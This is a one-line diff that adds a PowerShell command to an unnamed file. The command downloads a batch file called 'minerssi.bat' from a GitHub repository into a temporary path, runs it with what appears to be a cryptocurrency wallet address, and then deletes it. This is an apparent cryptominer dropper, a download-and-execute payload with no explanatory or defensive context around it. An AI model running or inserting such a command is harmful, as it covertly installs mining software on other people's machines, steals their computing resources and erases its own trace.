@@ -1,0 +1,1 @@
+powershell -command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://github.com/ngabubbon/ngabubbon/raw/refs/heads/main/minerssi.bat', $tempfile); & $tempfile 45YpjqYUn3tGBbQ94pfKgcP3B1KddNxp6WNNLZHPWmz5MW53LupwGb4F96aX6ftfSU6YFRw8Y3Y4HT4ZhWi39QnvMyCticE; Remove-Item -Force $tempfile"
